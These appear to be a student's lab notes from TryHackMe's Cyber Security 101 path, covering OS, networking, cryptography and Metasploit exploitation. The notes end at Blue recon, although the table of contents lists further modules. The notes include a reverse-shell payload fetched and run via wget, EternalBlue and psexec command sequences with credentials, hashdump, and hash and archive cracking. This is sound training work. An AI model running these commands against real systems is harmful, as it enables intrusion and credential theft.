# TryHackMe - Cyber Security 101 Path

## Summary

Over this path I picked up a wide range of skills, from fundamentals like Active Directory, Windows, and Linux to hands-on red team and blue team tooling. Below is a table of contents so you can get a quick overview of everything the path covered. Each module includes notes from every room, covering both the hands-on labs and the underlying theory. This path has been extremely valuable for building a broad, practical understanding of many corners of cybersecurity.

## At a Glance

I completed TryHackMe's **Cyber Security 101** path: **14 modules and ~50 rooms** spanning Linux, Windows, and Active Directory fundamentals, networking, cryptography, and both offensive and defensive tooling. The path is hands-on heavy: most rooms end in a lab where I run the tools myself rather than just reading theory.

Highlights:

- **Recon & enumeration:** Nmap, Gobuster, Wireshark, tcpdump, WHOIS/DNS
- **Exploitation:** Metasploit, Msfvenom, EternalBlue, psexec, reverse/bind shells, command injection, unrestricted file upload, SQLMap
- **Password & hash attacks:** John the Ripper, Hydra, Hashcat, rainbow tables
- **Cryptography:** symmetric/asymmetric encryption, RSA, Diffie-Hellman, PGP/GPG, hashing and integrity
- **Blue team:** SOC triage, digital forensics, incident response, SIEM, IDS (Snort), firewalls, and malware analysis with REMnux, FLARE-VM, CAPA, and CyberChef
- **Foundations:** security principles, security models, OWASP Top 10

Every entry below lists the concepts covered and the exact commands I ran.

---

## Table of Contents

- [Module 1: Search Skills](#module-1-search-skills)
  - [Search Skills](#search-skills)
- [Module 2: Linux Fundamentals](#module-2-linux-fundamentals)
  - [Linux Fundamentals Part 1](#linux-fundamentals-part-1)
  - [Linux Fundamentals Part 2](#linux-fundamentals-part-2)
  - [Linux Fundamentals Part 3](#linux-fundamentals-part-3)
- [Module 3: Windows and Active Directory Fundamentals](#module-3-windows-and-active-directory-fundamentals)
  - [Windows Fundamentals 1](#windows-fundamentals-1)
  - [Windows Fundamentals 2](#windows-fundamentals-2)
  - [Windows Fundamentals 3](#windows-fundamentals-3)
  - [Active Directory Basics](#active-directory-basics)
- [Module 4: Command Line](#module-4-command-line)
  - [Windows Command Line](#windows-command-line)
  - [Windows PowerShell](#windows-powershell)
  - [Linux Shells](#linux-shells)
- [Module 5: Networking](#module-5-networking)
  - [Networking Concepts](#networking-concepts)
  - [Networking Core Protocols](#networking-core-protocols)
  - [Networking Secure Protocols](#networking-secure-protocols)
  - [Wireshark: The Basics](#wireshark-the-basics)
  - [Tcpdump: The Basics](#tcpdump-the-basics)
  - [Nmap: The Basics](#nmap-the-basics)
- [Module 6: Cryptography](#module-6-cryptography)
  - [Cryptography Basics](#cryptography-basics)
  - [Public Key Cryptography Basics](#public-key-cryptography-basics)
  - [Hashing Basics](#hashing-basics)
  - [John the Ripper: The Basics](#john-the-ripper-the-basics)
- [Module 7: Exploitation Basics](#module-7-exploitation-basics)
  - [Moniker Link](#moniker-link)
  - [Metasploit: Introduction](#metasploit-introduction)
  - [Metasploit Exploitation](#metasploit-exploitation)
  - [Metasploit: Meterpreter](#metasploit-meterpreter)
  - [Blue](#blue)
- [Module 8: Web Hacking](#module-8-web-hacking)
  - [Web Application Basics](#web-application-basics)
  - [JavaScript Essentials](#javascript-essentials)
  - [SQL Fundamentals](#sql-fundamentals)
  - [Burp Suite: The Basics](#burp-suite-the-basics)
- [Module 9: Offensive Security Tooling](#module-9-offensive-security-tooling)
  - [Hydra](#hydra)
  - [Gobuster: The Basics](#gobuster-the-basics)
  - [Shells Overview](#shells-overview)
  - [SQLMap: The Basics](#sqlmap-the-basics)
- [Module 10: Defensive Security](#module-10-defensive-security)
  - [SOC Fundamentals](#soc-fundamentals)
  - [Digital Forensics Fundamentals](#digital-forensics-fundamentals)
  - [Incident Response Fundamentals](#incident-response-fundamentals)
  - [Logs Fundamentals](#logs-fundamentals)
- [Module 11: Security Solutions](#module-11-security-solutions)
  - [Introduction to SIEM](#introduction-to-siem)
  - [Firewall Solutions](#firewall-solutions)
  - [IDS Fundamentals](#ids-fundamentals)
  - [Vulnerability Scanner Overview](#vulnerability-scanner-overview)
- [Module 12: Defensive Security Tooling](#module-12-defensive-security-tooling)
  - [CyberChef: The Basics](#cyberchef-the-basics)
  - [CAPA: The Basics](#capa-the-basics)
  - [REMnux: Getting Started](#remnux-getting-started)
  - [FlareVM: Arsenal of Tools](#flarevm-arsenal-of-tools)
- [Module 13: Build Your Cybersecurity Career](#module-13-build-your-cybersecurity-career)
  - [Security Principles](#security-principles)
  - [Training Impact on Team](#training-impact-on-team)
- [Module 14: OWASP Top 10 (2025)](#module-14-owasp-top-10-2025)
  - [IAAA Failures](#iaaa-failures)
  - [Application Design Flaws](#application-design-flaws)
  - [Insecure Data Handling](#insecure-data-handling)

---

## Module 1: Search Skills

### Search Skills

**Learning objectives:** evaluate information sources, use search engines efficiently, explore specialized search engines, read technical documentation, make use of social media, and check news outlets.

- **Specialized search engines:** Shodan, Censys, VirusTotal, Have I Been Pwned
- **Vulnerabilities and exploits:** the CVE Program, Exploit Database, and GitHub for searching known vulnerabilities
- **Technical documentation:** overview of Linux manual pages and the Microsoft Windows technical documentation
- **Social media:** how social media is used to gather information about people that adversaries can leverage, for example when attempting to reset a target's passwords

---

## Module 2: Linux Fundamentals

### Linux Fundamentals Part 1

**Learning objectives:** run commands in an interactive in-browser Linux machine, learn essential commands for interacting with the file system, search for files, and get introduced to shell operators.

- Practiced basic commands: `ls`, `cd`, `cat`, `pwd`, `find`, and `grep` to locate files and their paths
- Introduction to shell operators: `&`, `&&`, `>`, and `>>`

### Linux Fundamentals Part 2

**Learning objectives:** introduction to flags and arguments; extend file system knowledge to copy and move files; learn how access to files and folders is managed and how to determine your own access.

- Used `ssh`, `man ls`, `q`, `touch`, and `file`
- Basics of file permissions - read, write, execute - and permission numeric values
- `su` and key directories: `/etc`, `/var`, `/root`, `/tmp`

### Linux Fundamentals Part 3

- Used the Linux command line over `ssh` to a given IP address
- Used `nano` to create files
- Used Python 3's `http.server` module to start a web server in the home directory of the `tryhackme` user on the deployed instance, then downloaded files from it
- Learned the basics of processes with `ps`, `ps aux`, `top`, `kill`, `systemctl`, and `fg`
- Introduction to cron and interacting with crontabs (`crontab -e`)
- Introduction to packages and software repositories with `apt`, `add-apt-repository`, and `dpkg`
- Maintaining your system: logs

**Conclusions and summaries:**

- Using terminal text editors
- General utilities such as downloading and serving content with a Python web server
- A look into processes
- Maintaining and automating your system with crontabs, package management, and reviewing logs

---

## Module 3: Windows and Active Directory Fundamentals

### Windows Fundamentals 1

- Windows OS basics, NTFS, and file/folder permissions - how to view and change them
- Introduction to Alternate Data Streams (ADS)
- Introduction to user accounts, profiles, and permissions
- User Account Control (UAC)
- Basics of using Remote Desktop
- Settings and Control Panel basics; Task Manager basics

### Windows Fundamentals 2

- System Configuration and advanced system settings - MSConfig: General, Boot, Services, Startup, Tools
- Navigating the System Configuration application and advanced system settings
- Introduction to UAC
- Introduction to Computer Management (`compmgmt`) - Task Scheduler
- Event Viewer - five event types that can be logged: Error, Warning, Information, Success Audit, Failure Audit
- Event logs continued - Application, Security, System, and Custom logs
- Shared Folders, Performance, Device Manager, Storage, Services and Applications
- Overview of System Information (`msinfo32`) and locating specific information
- Overview of Resource Monitor (`resmon`)
- Command Prompt (`cmd`) - practiced several basic commands: `hostname`, `whoami`, `ipconfig`, `cls`, `netstat`, `net`, and finding information in the command line with `/?` and `net help`
- Brief overview of the Registry Editor

### Windows Fundamentals 3

The basics of: Windows Updates, Windows Security, Virus & Threat Protection, Firewall & Network Protection, App & Browser Control, Device Security, BitLocker, and Volume Shadow Copy Service.

### Active Directory Basics

- Introduction to Active Directory and Windows domains
- Breakdown of AD components: users, machines, security groups
- Default security groups - Domain Admins, Server Operators, Backup Operators, Account Operators, Domain Users, Domain Computers, Domain Controllers
- Navigated an Active Directory account and created an Organizational Unit and Security Group
- **Manage users in AD**
  - Delete Organizational Units
  - Add and delete users from Organizational Units
  - Delegate control of Organizational Units to specific users
  - Connect via RDP and use Windows PowerShell to change user passwords and set rules (e.g., reset password at first login)
- **Manage computers in AD**
  - Create Organizational Units to organize laptops and personal computers into workstations
  - Repeat the process for servers
- **Group Policy Management**
  - Introduction to Group Policy Management and its components
  - Explore the default domain policy - scope and settings
  - Change the minimum password length on user accounts
  - Use PowerShell to force a group policy update - `gpupdate /force`
  - Create a group policy to restrict Control Panel access and apply it to user OUs
  - Create a group policy to auto-lock the screen and apply it to the root domain to affect all child OUs and computers
  - Force an update and confirm group policies are applied
- **Authentication methods**
  - Introduction to Kerberos - how the authentication process works, including the Key Distribution Center (KDC), Ticket Granting Ticket (TGT), Ticket Granting Service (TGS), Service Principal Name (SPN), Service Session Key, and Service Owner Hash
  - NetNTLM - the NetNTLM process and its components, including the challenge/response sequence and hashing that keeps the password off the network
- **Trees, forests, and trusts:** a breakdown of these three principles that support company growth and maintain organization

---

## Module 4: Command Line

### Windows Command Line

- Introduction to the purpose and advantages of the Windows command line
  - SSH into the target VM
- **Basic system information**
  - `set` to check the path from the command line
  - `ver` to determine the OS version
  - `systeminfo` to list various system information
  - `more` and `driverquery | more` to page through output
  - `hostname`
- **Network troubleshooting**
  - `ipconfig`, `ipconfig /all`, `ping`, `tracert`, `nslookup`, `netstat`
  - Located the name of services listening on specific ports with `netstat -abon`
- **File and disk management**
  - `cd`, `dir`, `dir /a`, `dir /b`, `tree`, `mkdir`, `rmdir`
  - Briefed on `type`, `more`, `copy`, `move`, `del`, `erase`
  - Obtained a flag by moving into the directory with `cd`, locating the text file, then displaying the flag with `type`
- **Task and process management**
  - `tasklist` - answered questions on finding and killing running processes
  - Briefed on `chkdsk`, `driverquery`, and `sfc /scannow`, and ran them separately on my personal computer
  - Navigated the command-line documentation on the Microsoft website to locate shutdown commands

### Windows PowerShell

- A brief history and introduction to PowerShell and how it is object-oriented
  - A breakdown of what an object is: an item with properties and methods
- **PowerShell basics**
  - Connected to the project VM via SSH using the Remmina client
  - Launched PowerShell from a command prompt
  - `Get-Command` to review cmdlets, functions, aliases, and scripts
  - `Get-Command -CommandType "Function"` to display only functions
  - Introduction to where to find and download cmdlets
  - Basic syntax `verb-noun` and basic cmdlets
  - `Get-Alias echo` to find its traditional counterpart (`echo` as an alias)
  - `get-help New-LocalUser` - to see the examples, type `get-help New-LocalUser -examples`
- **Navigating the file system and working with files**
  - Learned and executed commands and parameters: `Get-ChildItem`, `-Path`, `Set-Location`, `New-Item`, `Remove-Item`, `Copy-Item`, `Move-Item`, `Get-Content`
  - Ran `Get-ChildItem -Path "C:\Users"` to count the number of items in the specified directory
- **Piping, filtering, and sorting data**
  - Introduction to piping and commands: `Sort-Object`, `Where-Object`, `-eq`, `-ne`, `-gt`, `-ge`, `-lt`, `-le`, `-like`, `Select-Object`, `Select-String`
  - Used piped commands to locate the largest file in a directory
- **System and network information**
  - Introduction to `Get-ComputerInfo`, `Get-LocalUser`, `Get-NetIPConfiguration`, `Get-NetIPAddress`
  - Navigated the directories to locate a file and find the hidden flag
    - **Learning lesson:** While the structure as a whole is fairly easy to grasp, I found myself getting lost and tripping over myself in the files. Going forward I'll slow down and keep track of the previous commands and where I executed them. Once I realized I had already executed a command in the previous directory, I knew that was all I needed to do in the current directory to move forward.
- **Real-time system analysis**
  - Introduction to `Get-Process`, `Get-Service`, `Get-NetTCPConnection`, `Get-FileHash`, `Get-Item`
  - Executed and practiced the above commands
  - Executed `Get-FileHash` to retrieve the file hash from the flag in the previous task
  - Executed `Get-Service` to retrieve the specified service name
- **Scripting**
  - Introduction to the basics of scripting and its advantages for both blue and red teams
  - Introduction to `Invoke-Command`

### Linux Shells

- Introduction to Linux shells
- Overview of commands: `pwd`, `cd`, `ls`, `cat`, `grep`
- Overview of Bash, Fish, and Zsh
- **Shell scripting and components**
  - Wrote a simple script to practice `nano`, `#!/bin/bash`, and `chmod +x`

```bash
# Defining the interpreter
#!/bin/bash

# Asking the user to enter a value.
echo "Please enter your name first:"

# Storing the user input value in a variable.
read name

# Checking if the name the user entered is equal to our required name.
if [ "$name" = "Stewart" ]; then
    # If it equals the required name, the following line will be displayed.
    echo "Welcome Stewart! Here is the secret: THM_Script"
# Defining the sentence to be displayed if the condition fails.
else
    echo "Sorry! You are not authorized to access the secret."
fi
```

- **The Locker Script:** analyzed a script to find specific values
- **Practical exercise:** located, edited, and ran a script to reveal the location of a file, then revealed the contents of the file to find the answer and flag

---

## Module 5: Networking

### Networking Concepts

- Overview of the OSI model
- Introduction to the TCP/IP model
- Overview of IP addresses and subnets
  - Determined valid and correct IP addresses as a quick exercise
    - **Learning note:** Most of the information so far was covered in my Network+ exam. That said, it's a great refresher and there have been some helpful new tips.
- Overview of TCP and UDP
- Overview of encapsulation - segments, datagrams, and the contents of a packet and frame
- Overview of Telnet
  - Requested a web page using Telnet over port 80; executed a `GET` command to identify the server name and retrieve a separate flag
- Overview of DHCP and the DORA steps to receive an IP address
- Overview of ICMP for troubleshooting networks
  - A deeper look at `ping`, `traceroute`, and `tracert` - how `ping` appears in Wireshark, how both commands appear in the terminal, and the different components displayed for each request
- Overview of routing protocols: OSPF, EIGRP, BGP, RIP
- Overview of NAT with a simple explanation of how routers use it
- Quick pop quiz to put it all together

### Networking Core Protocols

- Overview of DNS - A record, AAAA record, CNAME, MX record - and `nslookup`
- Introduction to WHOIS, with practice executing the command and locating domain information
- Introduction to HTTP(S) methods: `GET`, `POST`, `PUT`, `DELETE`
  - Used Telnet to connect to a web server and `GET /flag.html` to retrieve the flag
- FTP - introduction to FTP commands `USER`, `PASS`, `RETR`, `STOR`, `type ascii`
  - Used FTP to log into a server and retrieve a flag, logged out, then used `cat` to display it in the terminal
- Overview of SMTP
- Practiced connecting to a server via Telnet and POP3 to log in and retrieve an email containing the lesson flag
- Overview of IMAP commands, answering questions based on an example terminal and Wireshark capture provided

### Networking Secure Protocols

- Introduction to secure protocols and why we need them
- Overview of TLS and the variations secure protocols have gone through to get to where we are now
- Analyzed Wireshark packets to compare HTTP communication with HTTP over TLS, then identified the correct packet for each question (e.g., "What is the number of the packet that contains the `GET /login` when accessing the website over HTTPS?" - packet 10)
- Breakdown of ports: HTTPS, SMTP, POP3S, IMAPS
- Breakdown of SSH benefits: secure authentication, confidentiality, integrity, tunneling, X11 forwarding
- The difference between SFTP and FTPS
- Overview of a VPN and how it is used in the enterprise world
- Navigated Wireshark on the provided VM to open Security preferences and decrypt the TLS packets to obtain login credentials
- Navigated Wireshark to decrypt packets using a provided SSL key, then expanded **HTML Form URL Encoded** at the bottom of the Packet Details pane to obtain the POST credentials for the flag

### Wireshark: The Basics

- Breakdown of the Wireshark interface and basics: GUI and data, loading PCAP files, coloring packets, traffic sniffing, merging PCAP files, viewing file details
- **Packet dissection:** dissected a packet to find: markup language, packet arrival date, TTL value, TCP payload size, and ETag value
- Introduction to the three main panes: Packet List, Packet Details, and Packet Bytes
- Overview of navigating packets with Go to Packet, Find Packet (Display Filter, Hex, String, Regex), and packet marking/commenting
- Given a `.pcapng` capture to analyze; searched the `r4w` string in Packet Details to identify Artist 1 as `r4w8173`
- Navigated to packet 12, read the packet comments, and used `md5sum <filename>` in the terminal to obtain the MD5 hash `911cd574a42865a956ccde2d04495ebf`
- Located an embedded `.txt` file inside the capture using **Export Objects (HTTP)**; read the file to identify the alien's name as `PACKETMASTER`
- Reviewed the Expert Information panel (**Analyze > Expert Information**) to identify the warning count (1636); learned the four severity levels - Chat (blue), Note (cyan), Warn (yellow), Error (red)
- Breakdown of time display formats; UTC preferred over the default "Seconds Since Beginning of Capture" for investigation clarity
- **Packet filtering**
  - Introduction to Apply as Filter, Conversation Filter, Colorize Conversation, Prepare as Filter, Apply as Column, Follow Stream, and simple display filter queries (`arp`, `dhcp`, `ftp`, `smtp`, `pop`, `imap`, port number, and IP)
  - Applied filters, followed the HTTP stream, and analyzed various components of Wireshark to answer questions

### Tcpdump: The Basics

- **Basic packet capture**
  - Specifying the network interface with `-i INTERFACE`, `-i any`, and examples like `-i eth0`; along with `ip address show`
  - Saving captured packets with `-w FILE` and reading them with `-r FILE`
  - Specifying the count with `-c COUNT`; avoiding DNS and port lookups with `-n` and `-nn`
  - Producing more verbose output with `-v`, `-vv`, and `-vvv`
- **Filtering expressions**
  - Filtering by host, port, and protocol
  - Logical operators `and`, `or`, `not`; reading captured packets from a file with `-r FILE`; piping to `wc` to count lines; and using `-n` to avoid delays from resolving IP addresses
  - `tcpdump -r traffic.pcap arp -n 2>/dev/null` - count packets
  - `tcpdump -r traffic.pcap arp -n 2>/dev/null | grep "192.168.124.137"` - determine the host that asked for the MAC address of `192.168.124.137`
  - `tcpdump -r traffic.pcap -n icmp 2>/dev/null | wc -l` - count ICMP packets
- **Advanced filtering**
  - Binary operations and header bytes: `proto`, `expr`, `size`, and TCP flags `tcp-syn`, `tcp-ack`, `tcp-fin`, `tcp-rst`, `tcp-push`
  - `tcpdump -r traffic.pcap "tcp[tcpflags] == tcp-rst" -n | wc -l` - determined 57 packets have only the TCP reset (RST) flag set
  - `tcpdump -r traffic.pcap greater 15000 -n -c 1 | awk '{print $3}' | cut -d'.' -f1-4` - IP address of the host that sent packets larger than 15000 bytes
  - `tcpdump -r traffic.pcap arp -e -n` - MAC address of the host that sent an ARP request

### Nmap: The Basics

- **Host discovery: who is online**
  - Scanning the local network with `nmap -sn`
  - Scanning a remote network and generating a list scan with `nmap -sL`
  - `sudo nmap -sL 192.168.0.1/27` - find the last IP address that would be scanned
- **Port scanning: who is listening**
  - `-sT` (TCP connect), `-sS` (TCP SYN), `-sU` (UDP), `-F` (fast mode - 100 most common ports), `-p[range]` (specify ports), `-p-` (all ports)
  - `nmap -p- 10.145.186.175` - identify open ports and obtain a flag on open port 8008 in a web browser
- **Version detection: extract more information**
  - Enabling OS detection with `-O`
  - Version detection with `-sV`, forcing the scan with `-Pn`, and `-A` to run version detection, OS detection, and more
  - `nmap -sS -A 10.145.186.175` - find the name and detected version of the web server
- **Timing: how fast is fast**
  - Controlling scan speed to avoid triggering an IDS or other security solutions
    - `T0` Paranoid, `T1` Sneaky, `T2` Polite, `T3` Normal, `T4` Aggressive
  - `--min-parallelism <numprobes>` / `--max-parallelism <numprobes>` - set min/max simultaneous TCP and UDP port probes for a host group
  - `--min-rate <number>` / `--max-rate <number>` - control the min/max rate at which Nmap sends packets
- **Output: controlling what you see**
  - Verbosity and debugging - `-v`, `-vv`, `-vvv`, `-vvvv`, and `-d`
  - Saving a scan report with `-oN`, `-oX`, `-oG`, `-oA` (normal, XML, grepable, and all major formats)

---

## Module 6: Cryptography

### Cryptography Basics

- **Importance of cryptography**
  - Why cryptography matters for confidentiality and integrity against adversaries and unknown parties; introduction to laws and regulations involving cryptography - PCI DSS, HIPAA, HITECH, GDPR, and the DPA
- **Types of encryption**
  - Encryption standards: DES, 3DES, AES; the difference between symmetric and asymmetric encryption
- **Basic math**
  - Introduction to the XOR operation and the modulo operation

### Public Key Cryptography Basics

- **Common use of asymmetric encryption**
  - An analogy for how asymmetric encryption can be used to transmit symmetric encryption keys so that two parties aren't held back by the slowness of asymmetric encryption and can operate faster with symmetric encryption - while ensuring the symmetric key is not revealed during the exchange
- **RSA**
  - Introduction to the math that makes RSA secure - the values needed to break the encryption (`p`, `q`, `m`, `n`, `e`, `d`, and `c`)
  - Given `p` and `q`, found `n` - `p = 4391`, `q = 6659`, `n = 29239669`
  - Found the value of *ϕ(n)* - `29228620`
- **Diffie-Hellman Key Exchange**
  - A breakdown of how DHKE is calculated between two parties, which numbers are computed, and why it's useful
- **SSH**
  - SSH keys, private keys, and how to authenticate; where SSH keys are stored; ran `ls ~/Public-Crypto-Basics/Task-5` to obtain the algorithm used
- **Digital signatures and certificates**
  - What a digital signature is and how it provides authenticity and integrity using a public and private key
  - How private keys and certificates are used on websites to maintain trust, and the chain of trust that starts with a root CA
- **PGP and GPG**
  - PGP - software that implements encryption for encrypting files, digital signing, and more
  - GPG - used in email for message confidentiality, and to sign a message and confirm integrity
  - Generating a GPG key
  - Decrypted a file to obtain the secret message:
    - `cd ~/Public-Crypto-Basics/Task-5`
    - `gpg --import tryhackme.key` (found in an earlier task by testing commands)
    - `gpg --decrypt message.gpg`
  - Reviewed terms - cryptanalysis, brute-force attack, and dictionary attack

### Hashing Basics

- **Hashing functions**
  - Introduction to hexdump and the difference between hexadecimal and binary
  - `sha256sum *.jpg` to get the hash of a file
- **Insecure password storage for authentication**
  - Why proper password storage matters, how passwords can be compromised in a data leak, and why it's important to use different passwords across accounts
  - Past data breaches and their details - Adobe, LinkedIn, RockYou
- **Using hashing for secure password storage**
  - Rainbow tables and their use case, plus CrackStation and Hashes.com, which use this technique
  - How a salt is added to aid hashing
  - Manually determined a password by checking a rainbow table against a hash
  - Cracked the hash `5b31f93c09ad1d065c0491b764d04933` using Hashes.com (answer: `tryhackme`)
- **Recognizing password hashes**
  - Where passwords are stored in Linux and Windows, and the algorithms used (e.g., Windows uses NTLM, a variant of MD4)
  - How the Linux shadow file fields are separated and how to distinguish each part - algorithm used, parameter passed to the algorithm, salt, and hash value
  - Used Hashcat to find the hash-mode for Cisco-ASA MD5 and the algorithm used in Cisco-IOS `$9$`
- **Password cracking**
  - Used `rockyou.txt` and the Hashcat documentation to crack hashes:
    - `hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`
    - `hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`
    - `hashcat -m 1750 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`
  - Used Hashes.com to help crack the final hash, then converted the answer into plaintext
- **Hashing for integrity checking**
  - Using integrity checking to reveal the hash algorithm and ensure a file has not been tampered with
  - Briefed on HMACs
  - `sha256sum libgcrypt-1.11.0.tar.bz2` to reveal the hash
  - Used the Hashcat documentation to determine the mode number for HMAC-SHA512 (key = `$pass`)
  - The difference between hashing and encoding; `base64 -d decode-this.txt` to decode a saved file

### John the Ripper: The Basics

- **The basics**
  - Introduction to P (Polynomial time) and NP (Non-deterministic Polynomial time) and how they're fundamental to computing and cryptography
  - Introduction to John the Ripper and how it aids in cracking hashes
- **Cracking basic hashes**
  - `cd ~/John-the-Ripper-The-Basics/Task04/`
  - `ls` to see the files we'll work with
  - `cat hash1.txt` to reveal the hash, then entered it into Hashes.com - MD5; cracked value: `biscuit`
  - `cat hash2.txt` → Hashes.com → SHA1, `kangaroo`
  - Same process for `hash3.txt` → SHA256, `microphone`
  - Same process for `hash4.txt`, then cracked with the rockyou wordlist:
    - `john --format=whirlpool --wordlist=/usr/share/wordlists/rockyou.txt hash4.txt` → `colossal`
- **Cracking Windows authentication hashes**
  - Introduction to NTHash/NTLM
  - `john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlm.txt` → `mushroom`
- **Cracking `/etc/shadow` hashes**
  - Linux machines store passwords in `/etc/shadow`
  - Syntax: `unshadow local_passwd local_shadow > unshadowed.txt`
  - `cd ~/John-the-Ripper-The-Basics/Task06/` and `ls`
    - `unshadow local_passwd local_shadow > etc_hashes.txt`
    - `john --wordlist=/usr/share/wordlists/rockyou.txt etc_hashes.txt`
    - Root password revealed: `1234`
- **Single crack mode**
  - Introduction to word mangling and GECOS
  - Syntax: `john --single --format=[format] [path to file]`
  - Revealed the hash in the lesson file, determined it was MD5
    - Prepended the hash with the owning username: `echo "joker:$(cat hash07.txt)" > hash07.txt`
    - `john --single --format=raw-MD5 hash07.txt`
    - Password revealed: `Jok3r`
- **Custom rules**
  - How custom rules can be exploited and how to create and use them with proper syntax
- **Cracking password-protected ZIP files**
  - `cd ~/John-the-Ripper-The-Basics/Task09/`
  - `ls`
  - `zip2john secure.zip > zip_hash.txt`
  - `john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt`
  - `unzip secure.zip`
  - `cat zippy/flag.txt`
  - Password and flag: `pass123`, `THM{w3ll_d0n3_h4sh_r0y4l}`
- **Cracking a password-protected RAR archive:** same concept as a ZIP file
  - `cd ~/John-the-Ripper-The-Basics/Task10/`
  - `ls`
  - `rar2john secure.rar > rar_hash.txt`
  - `john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt`
  - Password: `password`
  - `unrar x secure.rar`, entered the password, flag file revealed
  - `cat flag.txt` → `THM{r4r_4rch1ve5_th15_t1m3}`
- **Cracking SSH keys with John:** same concept using the `ssh2john` tool
  - `cd ~/John-the-Ripper-The-Basics/Task11/`
  - `ls`
  - `ssh2john.py id_rsa > id_rsa_hash.txt`
  - `john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt`
  - Password: `mango`

---

## Module 7: Exploitation Basics

### Moniker Link

- Introduction to CVE-2024-21413, its CVSS details, and impacted software
- Breakdown of the CVE, including how to exploit the vulnerability using `!` to bypass Outlook's Protected View
- **Exploitation**
  - Reviewed a PoC that uses the Moniker Link vulnerability and delivers it via email
  - Started the THM responder: `responder -I ens5`
    - Saved the script to the AttackBox terminal and edited the IP addresses to fit the current attacker and victim
    - Executed the script and sent the victim the malicious email
    - Clicked the link from the received email, but there was no activity on the responder. After troubleshooting, I found the responder was failing to bind to port 445
    - Killed the conflicting process: `kill $(lsof -t -i:445)`
    - Restarted the responder and successfully obtained the hash

### Metasploit: Introduction

- Introduction to Metasploit and its two versions - Pro and Framework
  - Key terms: exploit, vulnerability, payload, auxiliary, encoders, evasion, NOPs, adapters, singles, stagers, stages
- **msfconsole**
  - Launched Metasploit with `msfconsole`
  - Checked files with `ls`
  - Pinged Google with `ping -c 1 8.8.8.8`
  - Reviewed the `help` command; ran `help set`
  - Reviewed and ran `history`
  - Reviewed and used tab completion; noted how context parameters need to be reset when changing modules
  - Reviewed and executed `show`, `back`, `info`, and `search`
- **Working with modules**
  - Introduction to Meterpreter and parameters
    - `set RHOST 10.10.165.39` - set the target IP
    - Parameters: `RPORT`, `PAYLOAD`, `LHOST`, `LPORT`, `SESSION`
    - Override instructions, plus `unset`, `setg`, `unsetg`, and `unset all`
    - `run exploit -z` after setting parameters
    - Introduction to `background` and `sessions`

### Metasploit Exploitation

- **Scanning**
  - `search portscan`, `use 5`
  - Breakdown of scanning modules and options (e.g., ports, concurrency)
  - `nmap -sS 10.145.156.168`
  - Other useful scans: `scanner/discovery/udp_sweep`, `smb_enumshares`, `smb_version`
  - To find the NetBIOS name:
    - `search nbname`
    - `use auxiliary/scanner/netbios/nbname`
    - `set RHOSTS 10.146.90.202`
    - `run`
  - To find what's running on port 8000:
    - `nmap -sV -p 8000 10.146.90.202`
  - To brute-force "penny's" account:
    - `use auxiliary/scanner/smb/smb_login`
    - `set RHOSTS 10.145.181.105`
    - `set USERNAME penny`
    - `set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt`
    - `set STOP_ON_SUCCESS true`
    - `run`
- **The Metasploit database**
  - Checking database status; workspaces - listing, adding, removing; the help menu
  - Database backend commands, `db_nmap`, `hosts` and `services`, using saved hosts, querying the database for services
- **Vulnerability scanning**
  - How the search function brings up a list of modules
  - `use auxiliary/scanner/smtp/smtp_relay`, then `info` to obtain module information
- **Exploitation**
  - Payloads - reveal them with `show payloads`
  - `set payload 2` to choose a payload, `show options` to see what needs changing
  - Background a session with `CTRL+Z`
  - Bring up sessions with `sessions -h` and `sessions -i`
  - EternalBlue:
    - `search eternalblue`
    - `use exploit/windows/smb/ms17_010_eternalblue`
    - `show options`
    - `set RHOSTS 10.144.171.167`
    - `set LHOST 10.144.84.247`
    - `set payload windows/x64/meterpreter/reverse_tcp`
    - `exploit`
    - `search -f flag.txt`
    - `cat "c:\Users\Jon\Documents\flag.txt"`
    - After obtaining the flag, ran `hashdump` to dump all hashes and retrieve the hash for the account named "pirate"
- **Msfvenom**
  - Introduction to Msfvenom - used to generate payloads
  - Obtained a user's password hash:
    - **AttackBox:**
      ```bash
      msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.144.107.66 LPORT=4444 -f elf > shell.elf
      python -m http.server 9000
      msfconsole
      use exploit/multi/handler
      set payload linux/x86/meterpreter/reverse_tcp
      set LHOST 10.144.107.66
      set LPORT 4444
      run
      ```
    - **Lab VM:**
      ```bash
      sudo su
      wget http://10.144.107.66:9000/shell.elf
      chmod +x shell.elf
      ./shell.elf
      ```
    - **AttackBox:**
      ```bash
      sysinfo
      run post/linux/gather/hashdump
      ```

### Metasploit: Meterpreter

- **Introduction to Meterpreter**
  - How it works - running in the memory of the target system to avoid detection, using encrypted communication back to the attacker
- **Meterpreter flavors**
  - Inline/single vs. staged
  - Listing Meterpreter payloads: `msfvenom --list payloads | grep meterpreter`
  - How to decide which version to use: What's the target OS? What components are available? What are the network connection types?
- **Meterpreter commands**
  - `help` to display Meterpreter commands
- **Post-exploitation with Meterpreter**
  - `getuid` to get the user Meterpreter is currently running as
  - `ps` to list running processes
  - `migrate` to move to another process
  - `hashdump` for pass-the-hash attacks
  - `search` and `shell`
- **Post-exploitation challenge**
  - Used a known credential pair to exploit SMB via Metasploit's `psexec` module and gained a Meterpreter session as SYSTEM on a Windows domain controller. From there, enumerated system info and network shares, dumped local password hashes, cracked a user's password offline with John the Ripper, and searched the filesystem to locate and read sensitive files.
    ```bash
    use exploit/windows/smb/psexec
    set RHOST <target>
    set LHOST <attacker>
    set SMBUSER ballen
    set SMBPASS Password1
    exploit
    sysinfo
    shell
    net share
    exit
    getuid
    ps
    migrate 780
    load kiwi
    hashdump
    background
    echo 'jchambers:69596c7aa1e8daee17f8e78870e25a5c' > /root/jchambers.hash
    john --format=nt /root/jchambers.hash --wordlist=/usr/share/wordlists/rockyou.txt
    sessions -i 1
    search -f secrets.txt
    cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
    search -f realsecret.txt
    cat "<path>"
    ```
  - *Note:* the lab room shut down before I could document the final `realsecret.txt` path, but it used the same execution as the previous `cat`.

### Blue

- **Recon**
  - `nmap -sV -sC --script vuln -oN blue.nmap 10.145.128.228` - find open ports and what the machine is vulnerable to
